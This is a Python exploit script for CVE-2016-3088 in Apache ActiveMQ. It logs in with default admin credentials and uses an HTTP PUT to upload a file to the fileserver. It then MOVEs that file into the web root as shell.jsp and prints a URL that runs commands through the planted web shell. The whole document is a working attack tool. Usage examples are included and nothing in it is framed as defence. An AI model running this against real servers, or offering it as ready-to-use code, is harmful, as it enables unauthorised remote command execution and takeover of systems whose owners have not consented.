#!/usr/bin/python
# -*- coding:utf-8 -*-
# __Author__: VVzv

import re
import base64
import requests
import argparse


def exp(domain, port, passwd):
    if 'http' not in domain:
        domain = "http://" + domain
    domain = domain + ":{}".format(port)
    admin_path_domain = domain + "/admin/test/systemProperties.jsp"
    login = 'admin:{}'.format(passwd)
    login_base = base64.b64encode(login.encode('utf-8'))

    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.68 Safari/534.24',
        'Authorization': 'Basic {}'.format(login_base.decode('utf-8')),
    }

    path_req = requests.get(admin_path_domain, headers=headers)
    if path_req.status_code == 200:
        root_path = re.findall('<td class="label">activemq.home</td>.*?<td>(.*?)</td>', path_req.text, re.S)[0]

        #uptext = '''your code'''
        f = open("shell.txt", "r")
        uptext = f.read()

	put_domain = domain + '/fileserver/shell.txt'
        put_req = requests.put(put_domain, headers=headers, data=uptext)
        if put_req.status_code == 204:
            move_file_header = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.68 Safari/534.24',
                'Destination': 'file://{}/webapps/api/shell.jsp'.format(root_path)
            }
            move_req = requests.request("MOVE", put_domain, headers=move_file_header)
            if move_req.status_code == 204:
                print("\033[1;32m[+] Success!\nFile Path:[ %s ]\033[0m" %(domain + "/api/shell.jsp?cmd=id"))
            else:
                print("\033[1;31m [-] Move Fail,status code's{}，please check!\033[0m".format(move_req.status_code))
        else:
            print("\033[1;31m [-] Write Fail,status code's{}，maybe is not CVE-2016-3088!\033[0m".format(put_req.status_code))
    else:
        print("\033[1;31m [-] Login Fail,please check the password!")

if __name__ == '__main__':
    description = '''use method:
    python3 cve-2016-3088.py -d 127.0.0.1
    python3 cve-2016-3088.py -d 127.0.0.1 -p 8161 -P password'''
    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
    try:
        parser.add_argument('-d', '--domain', help='target domain, required')
        parser.add_argument('-p', '--port', default='8161', help='target port, default 8161')
        parser.add_argument('-P', '--password', default='admin', help='target password, default admin')
        args = parser.parse_args()
        exp(domain=args.domain, port=args.port, passwd=args.password)
    except:
        parser.print_help()
